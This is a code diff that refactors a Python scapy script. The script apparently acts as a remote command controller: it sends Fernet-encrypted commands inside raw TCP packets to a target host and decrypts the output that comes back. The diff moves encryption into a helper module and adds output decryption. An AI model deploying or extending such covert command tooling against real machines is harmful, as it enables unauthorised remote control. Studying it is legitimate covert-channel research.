@@ -4,6 +4,7 @@
 from scapy.all import *
 from cryptography.fernet import Fernet
 import argparse
+import encrypt_utils as utils
 
 
 parser = argparse.ArgumentParser()
@@ -25,7 +26,7 @@ args = parser.parse_args()
 
 
 def send_command(destination, port, command):
-    encrypted_command = encrypt_data(command.encode("utf-8"))
+    encrypted_command = utils.encrypt_data(command.encode("utf-8"))
     pkt = IP(dst=destination)/TCP(sport=RandShort(), dport=int(port))/Raw(load=encrypted_command)
 
     send(pkt, verbose=False)
@@ -34,17 +35,10 @@ def send_command(destination, port, command):
 def display_output(packet):
     data = packet[Raw].load
 
+    # Decrypt output
+    data = utils.decrypt_data(data)
+
     print(data.decode("utf-8"))
-    
-
-def encrypt_data(data):
-    with open("keyfile.key", "rb") as keyfile:
-        key = keyfile.read()
-
-    fernet = Fernet(key)
-    encrypted_data = fernet.encrypt(data)
-
-    return encrypted_data
 
 
 def main():
